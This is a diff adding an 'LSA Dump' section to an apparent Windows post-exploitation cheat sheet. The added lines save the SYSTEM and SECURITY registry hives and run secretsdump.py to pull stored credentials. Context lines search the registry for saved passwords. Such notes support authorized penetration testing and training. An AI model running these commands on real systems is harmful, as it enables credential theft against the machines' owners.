@@ -140,6 +140,12 @@ Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartM
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
+LSA Dump
+
+```
+reg save HKLM\SYSTEM system & reg save HKLM\security security 
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
 
 ## Active Directory
 
